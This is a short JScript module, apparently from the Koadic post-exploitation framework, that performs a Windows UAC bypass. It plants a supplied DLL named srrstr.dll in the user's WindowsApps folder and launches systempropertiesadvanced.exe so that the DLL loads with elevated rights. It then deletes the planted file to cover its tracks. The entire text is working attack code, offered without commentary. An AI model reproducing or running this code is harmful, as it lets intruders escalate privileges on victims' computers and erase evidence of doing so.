try
{
    var myObject = new ActiveXObject("Scripting.FileSystemObject");
    var myPath = "C:\\Users\\"+ '~USER~' + "\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll";
    var dll = '~DLL~';
    myObject.CopyFile (dll, myPath);
    myObject.DeleteFile(dll);
    Koadic.shell.run("C:\\Windows\\syswow64\\systempropertiesadvanced.exe", true);
    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);
    myObject.DeleteFile(myPath);
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
